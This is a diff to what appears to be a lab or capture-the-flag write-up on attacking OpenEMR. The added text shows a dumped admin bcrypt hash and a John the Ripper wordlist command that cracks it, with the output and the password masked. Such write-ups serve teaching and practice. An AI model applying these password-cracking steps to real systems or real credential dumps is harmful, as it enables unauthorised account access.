@@ -189,4 +189,18 @@ Table: users_secure
 +----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
 ```
 
-From the output, we are able to obtain the username as ```openemr_admin``` and the password hash as ```$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.```. We will now try to break the password hash using John the Ripper.
+From the output, we are able to obtain the username as ```openemr_admin``` and the password hash as ```$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.```. Using John the Ripper, we manage to crack the hash as xxxxxx.
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ john --wordlist=rockyou.txt password.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 32 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xxxxxx           (?)
+1g 0:00:00:00 DONE (2021-08-23 21:11) 7.692g/s 6646p/s 6646c/s 6646C/s tristan..felipe
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
